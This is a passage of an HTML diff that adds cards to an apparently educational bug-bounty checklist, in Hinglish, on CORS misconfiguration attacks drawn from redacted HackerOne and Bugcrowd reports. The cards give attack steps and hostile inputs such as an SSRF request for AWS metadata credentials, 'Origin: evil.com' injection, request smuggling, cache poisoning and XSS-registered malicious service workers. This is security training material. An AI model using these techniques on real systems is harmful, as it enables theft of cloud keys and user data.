+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>API docs dhoondho</strong> — <code
+                                class="c">/swagger-ui.html</code>, <code class="c">/api/docs</code>, <code
+                                class="c">/redoc</code>, <code class="c">/graphql-playground</code> try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Docs endpoint par CORS test karo</strong> — Documentation
+                            endpoints par alag CORS policy hoti hai, usually loose.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Dork use karo</strong> — <code
+                                class="c">inurl:/swagger-ui.html site:target.com</code>, <code
+                                class="c">inurl:/api-docs</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Try-it-out se sensitive APIs call karo</strong> — "Interactive"
+                            docs se directly user data APIs hit karo.</span>
+                    </li>
+                </ul>
+                <div class="protip-box">
+                    <div class="protip-label">💡 PRO TIP</div>
+                    <div class="protip-text">"Documentation is an Asset, but also a Liability." Developers main app toh
+                        secure kar lete hain, par Swagger/Redoc/GraphQL Playground ki default settings aksar vulnerable
+                        hoti hain.</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #19 — Safari -->
+        <div class="report-card" data-severity="high" id="report-19">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #19 · Total #288</div>
+                    <div class="report-title">Safari Browser-Specific CORS Bypass (Airline)</div>
+                    <div class="report-target">🎯 ██████ (European Airline) · HackerOne Dork · $1,200 · Passport +
+                        Bookings</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Safari Quirk</span><span
+                            class="technique-tag">Data URI</span><span class="technique-tag">Multi-Origin</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Safari certain conditions mein (Data URI se request) origin ko <code
+                            class="c">null, https://target.com</code> jaisa dikha sakta hai. Server ne dekha "string
+                        mein target.com hai" → Access de diya. Hacker ne Safari-specific script se Passport Details +
+                        Flight Bookings chura liye.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Multi-browser test karo</strong> — Same payload Chrome, Firefox,
+                            Safari, Edge, Brave mein test karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Data URI trick karo</strong> — Safari mein Data URI se request
+                            initiate karke origin manipulation try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Mobile browsers test karo</strong> — iOS Safari, Android Chrome
+                            mein CORS handling alag hoti hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Multiple origin header try karo</strong> — <code
+                                class="c">Origin: null, https://target.com</code> manually inject karke test
+                            karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #20 — Cloud Metadata -->
+        <div class="report-card" data-severity="critical" id="report-20">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #20 · Total #289</div>
+                    <div class="report-title">Cloud Metadata Leak via CORS + SSRF Proxy (AWS)</div>
+                    <div class="report-target">🎯 ██████ (SaaS on AWS) · HackerOne Dork · $4,000 · AWS Keys + Full Infra
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Cloud Metadata</span><span
+                            class="technique-tag">169.254.169.254</span><span class="technique-tag">SSRF + CORS</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Internal proxy API <code class="c">/proxy?url=...</code> par <code
+                            class="c">Origin: *</code> allowed tha. Hacker ne proxy se AWS metadata hit kiya: <code
+                            class="c">/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+                        → AWS Access Key + Secret Key + Session Token = Poore cloud infrastructure ka Admin.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Proxy/URL fetcher endpoints dhoondho</strong> — <code
+                                class="c">/proxy</code>, <code class="c">/fetch</code>, <code
+                                class="c">/url-preview</code>, <code class="c">/image-resize?url=</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>CORS on proxy check karo</strong> — Proxy endpoint par <code
+                                class="c">Origin: evil.com</code> test karo, usually relaxed hota hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Cloud metadata test karo</strong> — <code
+                                class="c">169.254.169.254</code> (AWS), <code class="c">metadata.google.internal</code>
+                            (GCP) try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Internal IPs scan karo</strong> — <code
+                                class="c">127.0.0.1</code>, <code class="c">10.x.x.x</code>, <code
+                                class="c">172.16.x.x</code> — internal admin panels dhoondho.</span>
+                    </li>
+                </ul>
+                <div class="impact-box">
+                    <div class="impact-label">💥 IMPACT</div>
+                    <div class="impact-text">Sirf data leak nahi — poore server ki "Identity" chori ho gayi. Hacker
+                        server ke naam par AWS dashboard mein koi bhi command chala sakta tha. SSRF + CORS = Deadly
+                        Combo.</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ PHASE 6 — BONUS TECHNIQUES (BUGCROWD) ═══ -->
+<section class="phase-section" id="phase6">
+    <div class="phase-header"><span class="phase-number">PHASE 06</span><span class="phase-title">BONUS TECHNIQUES —
+            MISSING ATTACK VECTORS (BUGCROWD)</span><span class="phase-count" id="p6count">0 / 12 reports</span></div>
+    <div class="cards-grid" id="grid-phase6">
+
+        <!-- BONUS #21 — Preflight Bypass -->
+        <div class="report-card" data-severity="high" id="report-21">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #21 · BONUS · Bugcrowd</div>
+                    <div class="report-title">CORS Preflight (OPTIONS) Bypass via Simple Request</div>
+                    <div class="report-target">🎯 ██████.com (Fintech) · Bugcrowd · $2,000 · Data Exfiltration</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Preflight Bypass</span><span
+                            class="technique-tag">Simple Request</span><span class="technique-tag">Content-Type</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server OPTIONS (preflight) request ko reject kar raha tha par actual
+                        GET/POST ko nahi. Hacker ne "Simple Request" criteria use kiya — <code
+                            class="c">Content-Type: text/plain</code> + GET method → Browser ne bina preflight ke seedha
+                        request bhej di → Data leak.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Simple Request conditions samjho</strong> — GET/HEAD/POST + <code
+                                class="c">Content-Type: text/plain</code> = No preflight needed.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Custom headers hatao</strong> — <code
+                                class="c">X-Custom-Header</code> hatao taaki preflight trigger na ho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Content-Type change karo</strong> — <code
+                                class="c">application/json</code> → <code class="c">text/plain</code> se server accept
+                            kare toh preflight skip.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #22 — WebSocket -->
+        <div class="report-card" data-severity="critical" id="report-22">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #22 · BONUS · Bugcrowd</div>
+                    <div class="report-title">CORS Bypass via WebSocket Upgrade (No Origin Check)</div>
+                    <div class="report-target">🎯 ██████.io (Real-time App) · Bugcrowd · $3,500 · Real-time Data Hijack
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">WebSocket</span><span
+                            class="technique-tag">Upgrade Bypass</span><span class="technique-tag">No SOP</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">API pe CORS tight tha par WebSocket (<code class="c">wss://</code>) pe
+                        koi Origin check nahi tha. Browsers WebSocket connections par Same-Origin Policy enforce nahi
+                        karte. Hacker ne malicious page se <code class="c">new WebSocket('wss://target.com/ws')</code>
+                        se directly connect kiya → Real-time messages, notifications, private chats sab leak.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>WebSocket endpoints dhoondho</strong> — DevTools > Network tab
+                            mein <code class="c">WS</code> filter lagao.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Cross-origin WS connect karo</strong> — Apni site se <code
+                                class="c">new WebSocket('wss://target.com/ws')</code> try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Origin header check karo</strong> — WS handshake mein server
+                            Origin verify kar raha hai ya nahi.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Sensitive data monitor karo</strong> — Connected hone ke baad kya
+                            private data (messages, tokens) aa raha hai.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"WebSockets are the CORS blind spot." Browser CORS rules WebSocket
+                        connections par apply nahi hoti. Agar server Origin check nahi karta, toh koi bhi website
+                        connect kar sakti hai."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #23 — CDN/Load Balancer -->
+        <div class="report-card" data-severity="high" id="report-23">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #23 · BONUS · Bugcrowd</div>
+                    <div class="report-title">CORS via CDN/Load Balancer Misconfiguration</div>
+                    <div class="report-target">🎯 ██████.com (Streaming) · Bugcrowd · $1,500 · User Profile Data</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">CDN Bypass</span><span
+                            class="technique-tag">Cloudflare</span><span class="technique-tag">Origin Override</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">App ka backend CORS properly handle kar raha tha par CDN
+                        (Cloudflare/Akamai) apni layer par CORS headers add kar raha tha. CDN rule: "Agar request proxy
+                        se aaye toh <code class="c">Access-Control-Allow-Origin: *</code> daal do." → Backend secure par
+                        CDN ne tod diya.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>CDN identify karo</strong> — <code class="c">CF-Ray</code>
+                            (Cloudflare), <code class="c">X-Akamai-*</code>, <code class="c">X-Fastly-*</code> headers
+                            check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Direct vs CDN compare karo</strong> — Direct IP par request aur
+                            CDN domain par request bhejo — CORS headers alag hain?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>CDN-specific headers try karo</strong> — <code
+                                class="c">X-Forwarded-Host</code>, <code class="c">X-Original-URL</code> se CDN ka
+                            behavior change karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #24 — API Gateway -->
+        <div class="report-card" data-severity="critical" id="report-24">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #24 · BONUS · Bugcrowd</div>
+                    <div class="report-title">API Gateway CORS Misconfiguration (AWS API Gateway)</div>
+                    <div class="report-target">🎯 ██████.com (Banking API) · Bugcrowd · $4,000 · Financial Transactions
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">API Gateway</span><span
+                            class="technique-tag">AWS</span><span class="technique-tag">Lambda Proxy</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">AWS API Gateway mein CORS "Enable" kiya tha par Lambda function bhi CORS
+                        headers return kar raha tha. Duplicate CORS headers mein se ek <code class="c">*</code> tha →
+                        Browser ne loose wala accept kiya → Financial transaction APIs se data leak.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>API Gateway detect karo</strong> — <code
+                                class="c">x-amzn-requestid</code>, <code class="c">x-amz-apigw-id</code> headers = AWS
+                            API Gateway.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Duplicate CORS headers check karo</strong> — Response mein do
+                            <code class="c">Access-Control-Allow-Origin</code> headers hain? Browser pehla accept
+                            karega.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>OPTIONS vs GET compare karo</strong> — Preflight aur actual
+                            request mein CORS headers match hain ya nahi.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #25 — Unicode/Punycode -->
+        <div class="report-card" data-severity="high" id="report-25">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #25 · BONUS · Bugcrowd</div>
+                    <div class="report-title">Unicode/Punycode Domain Confusion — Origin Spoofing</div>
+                    <div class="report-target">🎯 ██████.com (SaaS) · Bugcrowd · $2,000 · Account Data</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Punycode</span><span
+                            class="technique-tag">Unicode</span><span class="technique-tag">IDN Homograph</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server target.com dekhta hai par hacker ne <code
+                            class="c">tаrget.com</code> (Cyrillic 'а') use kiya. Server ka string comparison match ho
+                        gaya kyunki visual same tha. Punycode: <code class="c">xn--trget-g5a.com</code> → Allowed as
+                        trusted origin → Account data leak.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Homograph domains try karo</strong> — <code class="c">а</code>
+                            (Cyrillic) instead of <code class="c">a</code>, <code class="c">е</code> instead of <code
+                                class="c">e</code>, <code class="c">о</code> instead of <code class="c">o</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Punycode register karo</strong> — <code class="c">xn--</code>
+                            prefix wale domains register karke CORS test karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>URL encoding mix karo</strong> — <code class="c">%E2%80%8B</code>
+                            (zero-width space) origin mein inject karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #26 — HTTP Request Smuggling -->
+        <div class="report-card" data-severity="critical" id="report-26">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #26 · BONUS · Bugcrowd</div>
+                    <div class="report-title">CORS via HTTP Request Smuggling (CL.TE)</div>
+                    <div class="report-target">🎯 ██████.com (Enterprise) · Bugcrowd · $5,000 · Mass Account Takeover
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Request Smuggling</span><span
+                            class="technique-tag">CL.TE</span><span class="technique-tag">Header Injection</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Frontend (Reverse Proxy) aur Backend server Content-Length aur
+                        Transfer-Encoding ko alag-alag parse kar rahe the. Hacker ne smuggled request mein <code
+                            class="c">Origin: https://evil.com</code> inject kiya → Backend ne next user ki request mein
+                        evil origin add kiya → Mass data theft.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>CL.TE/TE.CL detect karo</strong> — <code
+                                class="c">Content-Length</code> aur <code class="c">Transfer-Encoding</code> dono bhejo,
+                            response timing check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Origin inject karo smuggled request mein</strong> — Second request
+                            mein <code class="c">Origin: evil.com</code> header dalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Next user ki response check karo</strong> — Agle user ko
+                            CORS-enabled response milta hai ya nahi.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #27 — Vary Header Missing -->
+        <div class="report-card" data-severity="high" id="report-27">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #27 · BONUS · Bugcrowd</div>
+                    <div class="report-title">Vary Header Missing — Cache-Based CORS Exploitation</div>
+                    <div class="report-target">🎯 ██████.com (Media) · Bugcrowd · $1,500 · Subscriber Data</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Vary Missing</span><span
+                            class="technique-tag">Cache Key</span><span class="technique-tag">CDN Abuse</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server <code class="c">Vary: Origin</code> header nahi bhej raha tha. CDN
+                        ne pehli request ka response (attacker ka origin reflected) cache kiya → Ab har user ko wahi
+                        poisoned response milta tha → Mass-scale silent data theft.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Vary header inspect karo</strong> — Response mein <code
+                                class="c">Vary: Origin</code> missing hai? = Cache poisoning possible.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Cache key analyze karo</strong> — Kya Origin cached response ka
+                            part hai ya nahi? Same URL, different origin → same cached response?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Poison → Verify karo</strong> — Evil origin se hit karo, phir
+                            incognito mein same URL kholo → ACAO header check karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #28 — Service Worker -->
+        <div class="report-card" data-severity="high" id="report-28">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #28 · BONUS · Bugcrowd</div>
+                    <div class="report-title">CORS Bypass via Service Worker Interception</div>
+                    <div class="report-target">🎯 ██████.app (PWA) · Bugcrowd · $2,500 · Offline Data Theft</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Service Worker</span><span
+                            class="technique-tag">PWA Abuse</span><span class="technique-tag">Request Intercept</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">App PWA (Progressive Web App) use karti thi with Service Worker. Hacker
+                        ne XSS se malicious Service Worker register kiya jo saari outgoing requests ko intercept karta
+                        tha → CORS headers modify karke apne server par forward → Even offline cached data access kiya.
+                    </div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Service Worker check karo</strong> — DevTools > Application >
+                            Service Workers mein registered workers dekho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>SW registration scope check karo</strong> — Kya SW root scope
+                            (<code class="c">/</code>) par registered hai? Saari requests intercept ho rahi hain?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>XSS + SW registration try karo</strong> — XSS se <code
+                                class="c">navigator.serviceWorker.register('/evil-sw.js')</code> inject karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #29 — HTTP Method Override -->
+        <div class="report-card" data-severity="high" id="report-29">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #29 · BONUS · Bugcrowd</div>
+                    <div class="report-title">CORS via HTTP Method Override (X-HTTP-Method-Override)</div>
+                    <div class="report-target">🎯 ██████.com (SaaS) · Bugcrowd · $1,800 · API Data Leak</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Method Override</span><span
+                            class="technique-tag">PUT as POST</span><span class="technique-tag">Preflight Dodge</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">PUT/DELETE requests par CORS tight tha (preflight block). Hacker ne POST
+                        method use kiya (simple request = no preflight) + <code
+                            class="c">X-HTTP-Method-Override: PUT</code> header → Server ne PUT ki tarah process kiya
+                        par browser ne preflight nahi bheja → Data modification without CORS check.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Override headers try karo</strong> — <code
+                                class="c">X-HTTP-Method-Override</code>, <code class="c">X-Method-Override</code>, <code
+                                class="c">_method</code> parameter.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>POST se complex methods call karo</strong> — PUT, DELETE, PATCH ko
+                            POST through try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Content-Type downgrade karo</strong> — <code
+                                class="c">application/json</code> → <code class="c">text/plain</code> se preflight avoid
+                            karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #30 — Misconfigured Wildcard + Subdomain -->
+        <div class="report-card" data-severity="critical" id="report-30">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #30 · BONUS · Bugcrowd</div>
+                    <div class="report-title">Wildcard Subdomain Trust + Dynamic CORS Injection</div>
+                    <div class="report-target">🎯 ██████.io (SaaS Multi-tenant) · Bugcrowd · $3,000 · Cross-Tenant Data
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Wildcard Subdomain</span><span
+                            class="technique-tag">Multi-tenant</span><span class="technique-tag">Tenant Isolation</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Multi-tenant SaaS: <code class="c">tenant-a.target.io</code>, <code
+                            class="c">tenant-b.target.io</code>. CORS trusted <code class="c">*.target.io</code>. Hacker
+                        ne apna trial account banaya (<code class="c">evil-tenant.target.io</code>) → Ye automatically
+                        trusted ban gaya → Kisi bhi tenant ka data access kar liya — Cross-tenant isolation fail.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Multi-tenant apps identify karo</strong> — <code
+                                class="c">subdomain.target.com</code> pattern hai? Free trial signup karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
